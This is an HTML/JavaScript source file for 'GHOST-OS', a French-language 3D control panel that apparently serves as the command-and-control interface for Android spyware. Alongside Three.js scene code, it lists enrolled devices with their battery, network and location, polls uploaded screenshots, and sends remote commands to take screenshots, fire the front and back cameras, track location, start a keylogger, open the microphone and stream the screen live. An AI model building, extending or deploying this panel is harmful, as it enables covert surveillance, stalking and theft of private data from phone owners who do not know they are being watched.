<!-- panel/3d_phone.html -->
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GHOST-OS - Interface 3D</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/three@0.128.0/examples/js/controls/OrbitControls.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/three@0.128.0/examples/js/loaders/GLTFLoader.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { margin: 0; overflow: hidden; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        #info { position: absolute; top: 20px; left: 20px; color: white; z-index: 100; background: rgba(0,0,0,0.7); padding: 15px; border-radius: 10px; border-left: 4px solid #00ff88; }
        #controls { position: absolute; bottom: 30px; left: 50%; transform: translateX(-50%); z-index: 100; display: flex; gap: 15px; background: rgba(0,0,0,0.8); padding: 20px; border-radius: 50px; backdrop-filter: blur(10px); border: 1px solid #333; }
        .control-btn { width: 60px; height: 60px; border-radius: 50%; background: #1a1a1a; border: 1px solid #333; color: white; cursor: pointer; transition: all 0.3s; display: flex; align-items: center; justify-content: center; font-size: 24px; }
        .control-btn:hover { background: #00ff88; color: black; transform: scale(1.1); }
        #screen-content { position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 50; display: flex; align-items: center; justify-content: center; }
        .live-screen { width: 300px; height: 600px; background: black; border-radius: 30px; border: 3px solid #333; overflow: hidden; box-shadow: 0 0 50px rgba(0,255,136,0.3); transform: translateY(-20px); }
        .live-screen img { width: 100%; height: 100%; object-fit: cover; }
        #stats { position: absolute; top: 20px; right: 20px; color: white; z-index: 100; background: rgba(0,0,0,0.7); padding: 15px; border-radius: 10px; border-right: 4px solid #00ff88; }
        .device-dot { width: 10px; height: 10px; border-radius: 50%; display: inline-block; margin-right: 5px; }
        .online { background-color: #00ff88; box-shadow: 0 0 10px #00ff88; }
        .offline { background-color: #ff4444; }
    </style>
</head>
<body>
    <div id="info">
        <h1 class="text-2xl font-bold text-green-400">GHOST-OS</h1>
        <p class="text-sm text-gray-400">Interface de contr√¥le 3D</p>
        <div class="mt-2" id="device-status">
            <span class="device-dot offline" id="status-dot"></span>
            <span id="status-text">D√©connect√©</span>
        </div>
    </div>
    
    <div id="stats">
        <div class="mb-2">üì± <span id="device-name">Aucun appareil</span></div>
        <div class="mb-2">üîã Batterie: <span id="battery">--%</span></div>
        <div class="mb-2">üì° R√©seau: <span id="network">---</span></div>
        <div class="mb-2">üìç <span id="location">--</span></div>
        <div>üïí Derni√®re MAJ: <span id="last-update">--</span></div>
    </div>
    
    <div id="controls">
        <button class="control-btn" onclick="sendCommand('screenshot')" title="Capture d'√©cran">üì∏</button>
        <button class="control-btn" onclick="sendCommand('camera_front')" title="Cam√©ra avant">üì∑</button>
        <button class="control-btn" onclick="sendCommand('camera_back')" title="Cam√©ra arri√®re">üì±</button>
        <button class="control-btn" onclick="sendCommand('location')" title="Localisation">üìç</button>
        <button class="control-btn" onclick="sendCommand('keylogger_start')" title="Keylogger">‚å®Ô∏è</button>
        <button class="control-btn" onclick="sendCommand('microphone')" title="Microphone">üé§</button>
        <button class="control-btn" onclick="toggleStreaming()" id="stream-btn" title="Streaming en direct">‚ñ∂Ô∏è</button>
        <button class="control-btn" onclick="rotateView()" title="Rotation 3D">üîÑ</button>
    </div>
    
    <div id="screen-content">
        <div class="live-screen" id="live-screen">
            <img id="screen-img" src="https://via.placeholder.com/300x600/000000/333333?text=En+attente" alt="Live Screen">
        </div>
    </div>

    <script>
        // ============================================
        // INITIALISATION THREE.JS
        // ============================================
        const scene = new THREE.Scene();
        scene.background = new THREE.Color(0x0a0a0a);
        
        const camera = new THREE.PerspectiveCamera(45, window.innerWidth / window.innerHeight, 0.1, 1000);
        camera.position.set(0, 2, 8);
        
        const renderer = new THREE.WebGLRenderer({ antialias: true, alpha: false });
        renderer.setSize(window.innerWidth, window.innerHeight);
        renderer.shadowMap.enabled = true;
        renderer.shadowMap.type = THREE.PCFSoftShadowMap;
        renderer.setPixelRatio(window.devicePixelRatio);
        document.body.appendChild(renderer.domElement);
        
        // Contr√¥les
        const controls = new THREE.OrbitControls(camera, renderer.domElement);
        controls.enableDamping = true;
        controls.dampingFactor = 0.05;
        controls.autoRotate = true;
        controls.autoRotateSpeed = 1.0;
        controls.enableZoom = true;
        controls.maxPolarAngle = Math.PI / 2;
        
        // Lumi√®res
        const ambientLight = new THREE.AmbientLight(0x404060);
        scene.add(ambientLight);
        
        const dirLight = new THREE.DirectionalLight(0xffffff, 1);
        dirLight.position.set(5, 10, 7);
        dirLight.castShadow = true;
        dirLight.shadow.mapSize.width = 1024;
        dirLight.shadow.mapSize.height = 1024;
        scene.add(dirLight);
        
        const backLight = new THREE.PointLight(0x4466ff, 0.5);
        backLight.position.set(-2, 1, -3);
        scene.add(backLight);
        
        // Sol
        const gridHelper = new THREE.GridHelper(20, 20, 0x00ff88, 0x333333);
        gridHelper.position.y = -0.5;
        scene.add(gridHelper);
        
        // √âtoiles en arri√®re-plan
        const starsGeometry = new THREE.BufferGeometry();
        const starsCount = 2000;
        const starsPositions = new Float32Array(starsCount * 3);
        
        for (let i = 0; i < starsCount * 3; i += 3) {
            starsPositions[i] = (Math.random() - 0.5) * 200;
            starsPositions[i+1] = (Math.random() - 0.5) * 200;
            starsPositions[i+2] = (Math.random() - 0.5) * 200 - 50;
        }
        
        starsGeometry.setAttribute('position', new THREE.BufferAttribute(starsPositions, 3));
        const starsMaterial = new THREE.PointsMaterial({color: 0xffffff, size: 0.1});
        const stars = new THREE.Points(starsGeometry, starsMaterial);
        scene.add(stars);
        
        // ============================================
        // CR√âATION DU T√âL√âPHONE 3D
        // ============================================
        function createPhone() {
            const phoneGroup = new THREE.Group();
            
            // Corps principal
            const bodyGeo = new THREE.BoxGeometry(1.5, 3, 0.2);
            const bodyMat = new THREE.MeshStandardMaterial({ 
                color: 0x111111,
                roughness: 0.3,
                metalness: 0.7,
                emissive: 0x000000
            });
            const body = new THREE.Mesh(bodyGeo, bodyMat);
            body.castShadow = true;
            body.receiveShadow = true;
            body.position.y = 1.2;
            phoneGroup.add(body);
            
            // √âcran
            const screenGeo = new THREE.BoxGeometry(1.4, 2.8, 0.05);
            const screenMat = new THREE.MeshStandardMaterial({ 
                color: 0x000000,
                emissive: 0x111122
            });
            const screen = new THREE.Mesh(screenGeo, screenMat);
            screen.position.set(0, 1.2, 0.15);
            screen.castShadow = true;
            phoneGroup.add(screen);
            
            // Cam√©ra avant
            const cameraGeo = new THREE.SphereGeometry(0.05);
            const cameraMat = new THREE.MeshStandardMaterial({ color: 0x333333 });
            const cameraFront = new THREE.Mesh(cameraGeo, cameraMat);
            cameraFront.position.set(0, 2.5, 0.15);
            phoneGroup.add(cameraFront);
            
            // Boutons lat√©raux
            const buttonGeo = new THREE.BoxGeometry(0.1, 0.3, 0.1);
            const buttonMat = new THREE.MeshStandardMaterial({ color: 0x333333 });
            
            const volumeUp = new THREE.Mesh(buttonGeo, buttonMat);
            volumeUp.position.set(0.85, 1.8, 0);
            phoneGroup.add(volumeUp);
            
            const volumeDown = new THREE.Mesh(buttonGeo, buttonMat);
            volumeDown.position.set(0.85, 1.3, 0);
            phoneGroup.add(volumeDown);
            
            const powerBtn = new THREE.Mesh(buttonGeo, buttonMat);
            powerBtn.position.set(-0.85, 1.5, 0);
            phoneGroup.add(powerBtn);
            
            // Flash LED
            const flashGeo = new THREE.CylinderGeometry(0.1, 0.1, 0.05);
            const flashMat = new THREE.MeshStandardMaterial({ color: 0xffffaa, emissive: 0x442200 });
            const flash = new THREE.Mesh(flashGeo, flashMat);
            flash.rotation.x = Math.PI / 2;
            flash.position.set(0.4, 2.5, -0.15);
            phoneGroup.add(flash);
            
            return phoneGroup;
        }
        
        const phone = createPhone();
        scene.add(phone);
        
        // Anneau lumineux autour du t√©l√©phone
        const ringGeo = new THREE.TorusGeometry(1.8, 0.02, 16, 100);
        const ringMat = new THREE.MeshStandardMaterial({ color: 0x00ff88, emissive: 0x004422 });
        const ring = new THREE.Mesh(ringGeo, ringMat);
        ring.rotation.x = Math.PI / 2;
        ring.position.y = 1.2;
        ring.position.z = -0.5;
        scene.add(ring);
        
        // ============================================
        // VARIABLES GLOBALES
        // ============================================
        let currentDeviceId = null;
        let streaming = false;
        let streamInterval = null;
        let lastImageTime = 0;
        let autoRotate = true;
        
        // Charger les appareils
        loadDevices();
        
        // ============================================
        // FONCTIONS
        // ============================================
        
        function loadDevices() {
            const apiKey = localStorage.getItem('apiKey');
            if (!apiKey) {
                window.location.href = 'login.html';
                return;
            }
            
            fetch('/api/v1/devices.php', {
                headers: { 'X-API-Key': apiKey }
            })
            .then(r => r.json())
            .then(data => {
                if (data.devices && data.devices.length > 0) {
                    currentDeviceId = data.devices[0].id;
                    updateDeviceInfo(data.devices[0]);
                    
                    // D√©marrer la v√©rification des mises √† jour
                    startPolling();
                }
            });
        }
        
        function updateDeviceInfo(device) {
            document.getElementById('device-name').textContent = device.device_name || 'Android Device';
            document.getElementById('battery').textContent = device.battery_level || '--';
            document.getElementById('network').textContent = device.network_type || '---';
            
            const dot = document.getElementById('status-dot');
            const statusText = document.getElementById('status-text');
            
            if (device.online) {
                dot.className = 'device-dot online';
                statusText.textContent = 'En ligne';
            } else {
                dot.className = 'device-dot offline';
                statusText.textContent = 'Hors ligne';
            }
            
            if (device.last_location) {
                document.getElementById('location').textContent = device.last_location.address || `${device.last_location.lat}, ${device.last_location.lng}`;
            }
        }
        
        function startPolling() {
            // V√©rifier les nouvelles images toutes les 2 secondes
            setInterval(checkNewImage, 2000);
            
            // Mettre √† jour les infos toutes les 10 secondes
            setInterval(loadDevices, 10000);
        }
        
        function checkNewImage() {
            if (!currentDeviceId) return;
            
            const img = document.getElementById('screen-img');
            img.src = `/uploads/devices/${currentDeviceId}/screenshot/latest.jpg?t=${Date.now()}`;
            
            document.getElementById('last-update').textContent = new Date().toLocaleTimeString();
        }
        
        function sendCommand(command, params = '') {
            const apiKey = localStorage.getItem('apiKey');
            if (!apiKey || !currentDeviceId) return;
            
            fetch('/api/v1/commands_advanced.php?device_id=' + currentDeviceId, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-API-Key': apiKey
                },
                body: JSON.stringify({
                    command: command,
                    parameters: params,
                    priority: 'high'
                })
            })
            .then(r => r.json())
            .then(data => {
                if (data.success) {
                    showNotification('Commande envoy√©e', 'success');
                }
            });
        }
        
        function toggleStreaming() {
            streaming = !streaming;
            const btn = document.getElementById('stream-btn');
            
            if (streaming) {
                btn.style.background = '#00ff88';
                btn.style.color = 'black';
                btn.innerHTML = '‚è∏Ô∏è';
                
                // En mode streaming, on acc√©l√®re la capture
                sendCommand('streaming_start');
                
                if (streamInterval) clearInterval(streamInterval);
                streamInterval = setInterval(() => {
                    sendCommand('screenshot');
                }, 500);
            } else {
                btn.style.background = '#1a1a1a';
                btn.style.color = 'white';
                btn.innerHTML = '‚ñ∂Ô∏è';
                
                sendCommand('streaming_stop');
                if (streamInterval) {
                    clearInterval(streamInterval);
                    streamInterval = null;
                }
            }
        }
        
        function rotateView() {
            autoRotate = !autoRotate;
            controls.autoRotate = autoRotate;
        }
        
        function showNotification(msg, type) {
            // Simple notification
            const notif = document.createElement('div');
            notif.style.position = 'fixed';
            notif.style.bottom = '100px';
            notif.style.left = '50%';
            notif.style.transform = 'translateX(-50%)';
            notif.style.background = type === 'success' ? 'rgba(0,255,136,0.9)' : 'rgba(255,68,68,0.9)';
            notif.style.color = 'black';
            notif.style.padding = '10px 20px';
            notif.style.borderRadius = '20px';
            notif.style.zIndex = '1000';
            notif.style.fontWeight = 'bold';
            notif.textContent = msg;
            
            document.body.appendChild(notif);
            
            setTimeout(() => {
                notif.remove();
            }, 2000);
        }
        
        // ============================================
        // ANIMATION LOOP
        // ============================================
        function animate() {
            requestAnimationFrame(animate);
            
            controls.update();
            
            // Faire flotter le t√©l√©phone
            const time = Date.now() * 0.001;
            phone.position.y = 1.2 + Math.sin(time) * 0.05;
            phone.rotation.y = Math.sin(time * 0.5) * 0.1;
            
            // Rotation des √©toiles
            stars.rotation.y += 0.0001;
            
            renderer.render(scene, camera);
        }
        
        animate();
        
        // ============================================
        // GESTION REDIMENSIONNEMENT
        // ============================================
        window.addEventListener('resize', onWindowResize, false);
        function onWindowResize() {
            camera.aspect = window.innerWidth / window.innerHeight;
            camera.updateProjectionMatrix();
            renderer.setSize(window.innerWidth, window.innerHeight);
        }
    </script>
</body>
</html>
